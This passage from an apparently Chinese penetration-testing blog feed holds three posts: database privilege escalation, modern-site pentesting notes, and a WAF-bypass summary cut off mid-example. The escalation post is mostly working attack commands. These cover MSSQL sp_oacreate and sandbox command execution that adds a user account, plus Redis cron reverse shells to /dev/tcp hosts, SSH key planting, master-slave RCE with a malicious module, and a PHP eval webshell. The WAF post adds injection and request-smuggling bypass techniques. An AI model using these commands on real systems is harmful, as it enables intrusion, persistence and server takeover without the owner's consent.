Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><h4 id="sp_oacreate-提权"><a class="markdownIt-Anchor" href="#sp_oacreate-提权"></a> sp_oacreate 提权</h4><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。同样，他会默认关闭，遇到和xp_cmdshell一样的问题，则打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p>使用（<em>注意，我们需要对输出结果重定向，不然可能输出不出来，后面我们用webshell看就好了</em>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><h4 id="沙盒提权"><a class="markdownIt-Anchor" href="#沙盒提权"></a> 沙盒提权</h4><p>参考资料：<a href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p><p>按照步骤来就好</p><ol><li><p>提权语句（show advanced options设置为1就是可以更改配置）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p>不开启的话在执行 xp_regwrite 会提示让我们开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure></li><li><p>关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure></li><li><p>查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br></pre></td></tr></table></figure></li><li><p>执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）</p><p><code>0</code>：在任何所有者中禁止启用安全模式<br /><code>1</code>：为仅在允许范围内<br /><code>2</code>：必须在access模式下<br /><code>3</code>：完全开启</p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE  DB是应用程序链接到SQL Server的的驱动程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">恢复配置（暂不执行）</span><br><span class="line">--</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure></blockquote><h3 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> ORACLE</h3><p>测试：</p><ol><li>普通用户模式：拥有一个普通用户权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令</li><li>DBA用户模式：拥有DBA账户密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试</li><li>注入提升模式：拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</li></ol><p>注：</p><ul><li>jsp网站后门不用提权，默认就是system权限</li></ul><h4 id="oracle工具提权"><a class="markdownIt-Anchor" href="#oracle工具提权"></a> Oracle工具提权</h4><p>先使用sqlmap扫一下看是不是存在注入点，然后用rebeyond的工具干就完事了。</p><h3 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h3><p>Redis未授权漏洞：可以以root运行+使用内置指令+写入ssh密钥</p><p>常用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 链接数据库</span><br><span class="line">redis-cli -h &lt;ip&gt; -p 6397 -a &lt;passwd&gt;</span><br><span class="line"># 查看信息</span><br><span class="line">info</span><br><span class="line"># 设置变量/获取变量</span><br><span class="line">set x &quot;test&quot;</span><br><span class="line">get x</span><br><span class="line"># 删除数据库</span><br><span class="line">flushall</span><br><span class="line"># 设置主从关系</span><br><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure><h4 id="计划任务反弹shell"><a class="markdownIt-Anchor" href="#计划任务反弹shell"></a> 计划任务反弹shell</h4><p>计划任务（路径：<code>/var/spool/cron</code>）。执行命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.137</span><br><span class="line">set  x   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.80.137/5555 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意改一下IP端口就可以了，在自己的主机上：<code>nc -l -p 5555</code></p><h4 id="写入ssh-keygen"><a class="markdownIt-Anchor" href="#写入ssh-keygen"></a> 写入ssh-keygen</h4><p>条件：</p><ol><li>以root启动</li><li>开放ssh服务</li><li>未授权</li></ol><p>流程：</p><ol><li>在攻击机生成一个公钥文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/        #如果.ssh不存在的话,创建.ssh文件夹。</span><br><span class="line">ssh-keygen -t rsa     #执行完命令然后回车三次就结束了。</span><br><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><ol start="2"><li>未授权或者弱口令访问redis服务，并写入公钥：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis -h 192.168.223.132      登录redis服务</span><br><span class="line">config set dir /root/.ssh/    #设置保存路径</span><br><span class="line">config set dbfilename authorized_keys    #设置保存文件名</span><br><span class="line">set x &quot;\n\n\n ??? \n\n\n&quot;    #将公钥写入x键，用&quot;\n\n\n&quot;包裹住公钥，并且跟公钥之间用空格隔开</span><br><span class="line">save    # 保存</span><br></pre></td></tr></table></figure><ol start="3"><li>用私钥进行登录：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa    #第一次登陆需要输入yes</span><br></pre></td></tr></table></figure><h4 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h4><p>为了缓解数据库压力，redis使用两个服务器，一个负责读一个负责写，来减轻流量压力。在两个redis服务器设置主从模式的时候，主机实例可以通过<code>FULLRESYNC</code>指令同步文件在从机实例上，然后在从机上加载。</p><p>如果同步了恶意so文件，则从机加载该文件，我们主机就可以执行拓展命令。</p><p>条件：</p><ol><li>服务器允许与其他IP发起TCP请求</li><li>允许主从复制</li><li>版本：4.x-5.0.5（可以编译so文件）</li></ol><p>流程：</p><ol><li>攻击机对受害机：<code>slaveof ip port</code></li><li>使用Redis-RCE工具获取受害机的反弹shell（使用nc模拟Redis主服务器，进行模拟Redis主从交互过程）</li></ol><p>实现：</p><ol><li><p>生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>攻击端执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p><h4 id="低权限写入webshell"><a class="markdownIt-Anchor" href="#低权限写入webshell"></a> 低权限写入webshell</h4><p>流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.223.132</span><br><span class="line">192.168.223.132:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; set x &quot;&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><ol><li>绑定需要访问数据库IP，将127.0.0.1修改为需要访问该数据库的IP</li><li>修改帐号密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</li><li>低权限运行Redis</li><li>禁止使用帐号密码登录</li></ol><h3 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSql</h3><p>PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。 提权利用的是一下漏洞。流程为：连接-利用漏洞-执行-提权。</p><p>判断权限去应用以下漏洞：一般名字为PostgreSql的用户就是高权限</p><h4 id="cve-2018-1058"><a class="markdownIt-Anchor" href="#cve-2018-1058"></a> CVE-2018-1058</h4><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。（低权限用户用这个）</p><h4 id="cve-2019-9193"><a class="markdownIt-Anchor" href="#cve-2019-9193"></a> CVE-2019-9193</h4><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。（高权限提权）</p><h1 id="其他权限提升"><a class="markdownIt-Anchor" href="#其他权限提升"></a> 其他权限提升</h1><h2 id="服务类"><a class="markdownIt-Anchor" href="#服务类"></a> 服务类</h2><ol><li>FTP</li><li>RDP</li><li>SSH</li></ol><h2 id="第三方接口"><a class="markdownIt-Anchor" href="#第三方接口"></a> 第三方接口</h2><ol><li>支付</li><li>邮件</li></ol><h1 id="其他资源"><a class="markdownIt-Anchor" href="#其他资源"></a> 其他资源</h1><h2 id="复现注意"><a class="markdownIt-Anchor" href="#复现注意"></a> 复现注意</h2><ol><li>搭建数据库后要看防火墙是否把端口给拦截了，是的话重新开启</li></ol><h2 id="大马编写"><a class="markdownIt-Anchor" href="#大马编写"></a> 大马编写</h2><p><a href="https://blog.csdn.net/qq_53079406/article/details/125038306">https://blog.csdn.net/qq_53079406/article/details/125038306</a></p><h1 id="思维导图"><a class="markdownIt-Anchor" href="#思维导图"></a> 思维导图</h1><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36342e706e67.png" alt="img" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="提权" scheme="https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试需要注意的点</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/</id>
    <published>2023-06-14T01:08:03.000Z</published>
    <updated>2023-06-14T01:08:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。</p><ul><li>储存，数据库，网站程序等服务器高度分离</li><li>实现现代化前端技术， 如三大框架， html5新api， websocket</li><li>基于虚拟化技术的服务部署</li><li>使用现代后端框架，如ssm，think5，gin，django</li><li>外部服务高度集成</li><li>多种客户端，包括Android，Ios，windows</li></ul><p>篇幅有限， 不再列举，但相信读者应该能理解笔者的意思。</p><p>不属于现代化网站最典型的例子就是 下载cms，安装lnmp，直接安装网站程序。现在渗透教程基本都是基于不属于现代化网站的假设。</p><p>参考：<a href="https://blue-bird1.github.io/posts/newsitethink/">https://blue-bird1.github.io/posts/newsitethink/</a></p><h1 id="cdn反向代理"><a class="markdownIt-Anchor" href="#cdn反向代理"></a> CDN/反向代理</h1><p>使用了CDN将会隐藏真实IP， 导致常规端口扫描，弱口令扫描全部失效。但可以通过寻找真实ip来解决。反向代理则无解， 甚至可能只把代理服务器暴露于公网。敏感服务全在内网</p><p>对绕过CDN这个问题， 已经有了一定的研究。有了安全工具， 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p><h1 id="数据分离"><a class="markdownIt-Anchor" href="#数据分离"></a> 数据分离</h1><p>上传文件服务器分离，将导致上传webshell技术失效， 很显然文件服务器是不可能执行webshell的。 上传危害最多只能达到上传html</p><h1 id="websocket"><a class="markdownIt-Anchor" href="#websocket"></a> websocket</h1><p>之所以专门把websocket作为一点， 是因为感觉websocket属于盲区， burp，浏览器均不支持websocket的渗透测试。</p><h1 id="新的h5-api"><a class="markdownIt-Anchor" href="#新的h5-api"></a> 新的h5 api</h1><p>html5提供了新的api，但是这方面的安全问题还没有被开发人员重视。这个可以从hackone平台上的漏洞报告看出。例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www。hackerone。com via PostMessage</a> 。</p><p><code>postmessage</code>这类api的输入是不可控的，如果不进行控制， 就是安全问题。</p><h1 id="前后端分离"><a class="markdownIt-Anchor" href="#前后端分离"></a> 前后端分离</h1><p>使用三大框架(vue，react， angular)的前端， 对后端进行分离。 也就是不再将url参数直接渲染到html，而通过JavaScript操作。反射行xss全部失效，常规储存xss在框架的安全性下也变得渺茫。<strong>JavaScript操作带来的xss反而变为主流</strong>。这也对渗透测试人员阅读JavaScript代码带来了挑战，也带来了部分好处，由于在前端操作，后端暴露的接口将会更多。</p><h1 id="后端框架"><a class="markdownIt-Anchor" href="#后端框架"></a> 后端框架</h1><p>应用了框架后，简单注入全部失效，csrf部分失效， <code>id=x</code>这种低级注入消失。出现注入的点趋向<strong>二次注入</strong>， <strong>编码注入</strong>。 sqlmap是不提供原生支持的，所以一般都没用了，只适合找老漏洞。</p><h2 id="外部服务接入"><a class="markdownIt-Anchor" href="#外部服务接入"></a> 外部服务接入</h2><p>对某些功能不自行进行开发，使用其他公司的服务。这部分功能的安全性取决与该公司的安全水平， 不过真挖出漏洞就属于通用0day了。由于对接入服务的理解，接入处反而容易出现问题， 比如未预料的异常。</p><blockquote><p>接入开发: ???，这个问题你怎么不在服务上处理。</p><p>服务开发: ???，这个你怎么不在接入处处理</p></blockquote><h2 id="多服务端"><a class="markdownIt-Anchor" href="#多服务端"></a> 多服务端</h2><p>提供了多平台客户端， 这就对渗透测试多平台渗透能力发出了挑战。不但要会web，还要会安卓/ios渗透测试， 反编译(客户端总是会有一些未公开的api)。甚至还有IOT。</p><h2 id="风控"><a class="markdownIt-Anchor" href="#风控"></a> 风控</h2><p>好的风控系统基本阻止了邮箱/短信轰炸。对需要爆破的漏洞也降低了危害。</p><h2 id="xass"><a class="markdownIt-Anchor" href="#xass"></a> Xass</h2><p>Sass， Pass，Iass等各种服务公司不断涌现， 可能出现刚拿下shell，想内网渗透，发现实际上服务是在某Sass上。或者发现服务api是在Fass上的，根本没有服务器。这涉及到云安全。</p><p>参考：<a href="https://code84.com/837800.html">https://code84.com/837800.html</a></p><p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/574e9258d109b3de5413a7bf5412bc8b820a4cf5.png@f_auto" alt="img" /></p><h2 id="虚拟化"><a class="markdownIt-Anchor" href="#虚拟化"></a> 虚拟化</h2><p>docker提供了优秀的服务分离，就算拿到了shell，也只是拿到了容器的shell。 容器虚拟化不一定安全，但是现在对这方面的研究还不是很多， 完全没有对绕过UAC的研究多。</p><h1 id="对安全教程的思考"><a class="markdownIt-Anchor" href="#对安全教程的思考"></a> 对安全教程的思考</h1><p>现在一些安全教程还是停留在旧时代， <code>' and 1=1</code>，<code>&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>固然是基础，挖掘思路也很重要。但是随着技术的发展， 渗透和开发技术也会走的更近， 新开发技术的爆发式增长，不可能像列中间件漏洞一样全部写出它们的渗透技术。就算有人写出来，等写出来黄花菜都凉了。安全教程应该更强调编程， 而不是培养只会用扫描器的驻场工程师。</p><h1 id="对安全工具的思考"><a class="markdownIt-Anchor" href="#对安全工具的思考"></a> 对安全工具的思考</h1><h2 id="扫描器"><a class="markdownIt-Anchor" href="#扫描器"></a> 扫描器</h2><p>随着技术的扩散，老式扫描器未来会面临失效。不支持浏览器模拟，只会抓a标签的扫描器， 对前后端分离无能为力。 基于流量和基于爬虫的扫描器会合并， 走向模拟获取流量进行扫描的模式对app的扫描器目前不支持对web的渗透测试。</p><h2 id="人工智能"><a class="markdownIt-Anchor" href="#人工智能"></a> 人工智能</h2><p>人工智能火热，各路安全公司都号称使用了AI技术(实际上怎么样就不知道了)。 除了使用AI技术对AI进行对抗， AI扫描器也在发展中。<br />这部分知识，我推荐兜哥的AI安全三部曲。</p><p>可以重复的渗透测试动作，AI都可以模拟。随着发展，只会重复的渗透人员会面临淘汰。也能让安全人员拿出精力进行安全研究，而不是重复性的测试。</p><h1 id="尾言"><a class="markdownIt-Anchor" href="#尾言"></a> 尾言</h1><p>现在正是承前启后的时代，旧的开发技术未被淘汰，新的开发技术正在发展， 谁会在这个时代引领潮流， 或是被淘汰。让我们拭目以待吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;储存，数据库，网站程序等服务器高度分离&lt;/</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透技巧" scheme="https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>WAF绕过-一般性绕过总结</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2023-06-12T07:03:07.000Z</published>
    <updated>2023-06-14T07:03:07.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382132.png" alt="WAF绕过" /></p><h1 id="基础绕过"><a class="markdownIt-Anchor" href="#基础绕过"></a> 基础绕过</h1><p>基础绕过一般是针对于payload的绕过，之前迪哥也在各个章节多少有提到过，这里做一些总结。参考文献有：</p><ol><li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/07.WAF%E7%BB%95%E8%BF%87/01.WAF%E7%BB%95%E8%BF%87%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF.html">https://blog.gm7.org/个人知识库/01.渗透测试/07.WAF绕过/01.WAF绕过通用思路.html</a></li><li><a href="https://www.anquanke.com/post/id/212272#h2-11">https://www.anquanke.com/post/id/212272#h2-11</a></li></ol><h2 id="双写-大小写"><a class="markdownIt-Anchor" href="#双写-大小写"></a> 双写、大小写</h2><p>略</p><h2 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h2><p>这里要说一下：</p><ol><li><p>对于get方法来说，都是把数据串联在请求的url后面作为参数，然后对后面的参数进行URL-ENCODE编码。</p><blockquote><p>URL encode的过程就是把部分url作为字符，按照某种编码方式（如：utf-8，gbk等）编码成二进制的字节码，然后每个字节用一个包含3个字符的字 符串 “%xy” 表示，其中xy为该字节的两位十六进制表示形式。</p></blockquote></li><li><p>对于post方法来说，他将使用<code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集（GBK，utf-8等）&quot;/&gt;</code>中的<code>charset</code>字段定义编码。有四种方式：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>application/x-www-form-urlencoded</td><td>在发送前编码所有字符（默认）</td></tr><tr><td>multipart/form-data</td><td>不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。</td></tr><tr><td>application/json</td><td></td></tr><tr><td>text/plain</td><td>空格转换为 “+” 加号，但不对特殊字符编码。</td></tr><tr><td>text/html</td><td>html编码</td></tr></tbody></table></li></ol><p>所以编码可以分为：</p><ol><li>URL编码</li><li>HTML编码</li><li>Base64编码</li><li>Unicode编码</li><li>十六进制编码</li><li><strong>其他后端会解析的编码</strong></li></ol><h2 id="注释"><a class="markdownIt-Anchor" href="#注释"></a> 注释</h2><h2 id="垃圾字符"><a class="markdownIt-Anchor" href="#垃圾字符"></a> 垃圾字符</h2><p>一般waf只会拦截一点点，只要超过这个长度就不检测，所以可以把Payload写在后面</p><h2 id="分块传输"><a class="markdownIt-Anchor" href="#分块传输"></a> 分块传输</h2><p>严格来说分块传输并不是一种编码解码机制，但是从实际效果来看，大家都把分块传输当成是一种特殊的编码解码办法。里面的很多技巧和编码解码有相似之处。分块传输，又称为Http Chunked。分块传输本身适用于解决大文件传输的问题，属于http标准的协议功能，所有的WEB服务器均支持分块传输。在绕过WAF的测试中，分块传输也是属于编码/解码的一种。只需要设置如下头即可。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。</p><p>burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter.git">https://github.com/c0ny1/chunked-coding-converter.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613140646587.png" alt="image-20230613140646587" style="zoom:67%;" /><h2 id="http"><a class="markdownIt-Anchor" href="#http"></a> HTTP</h2><h3 id="http-09"><a class="markdownIt-Anchor" href="#http-09"></a> HTTP 0.9</h3><p>HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果</p><h3 id="https与http"><a class="markdownIt-Anchor" href="#https与http"></a> HTTPS与HTTP</h3><p>http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护</p><h3 id="参数污染"><a class="markdownIt-Anchor" href="#参数污染"></a> 参数污染</h3><p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。注意每种服务器获取到的参数的位置不同，例如apache是最后一个。</p><p>注入样例：<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code>。apache获取到最后一个，而waf服务器（tomcat）只解析重复参数里面的前者。</p><table><thead><tr><th>Web环境</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(“par”)</td><td>last</td></tr><tr><td>JSP/Tomcat</td><td>Request.getParameter(“par”)</td><td>first</td></tr><tr><td>Perl(CGI)/Apache</td><td>Param(“par”)</td><td>first</td></tr><tr><td>Python/Apache</td><td>getvalue(“par”)</td><td>[“first”,“last”]</td></tr><tr><td><a href="http://ASP.NET/IIS">ASP.NET/IIS</a></td><td>Request.QueryString(“par”)</td><td>first,last</td></tr></tbody></table><h3 id="pipelinekeep-alive"><a class="markdownIt-Anchor" href="#pipelinekeep-alive"></a> Pipeline（keep-alive）</h3><p>http请求头部中有<code>Connection</code>这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成<code>keep-alive</code>，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束<code>Connection</code>为<code>close</code>为止</p><p>我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf</p><blockquote><p>记得把brupsuite自动更新<code>Content-Length</code>的勾去掉</p></blockquote><p>参考数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 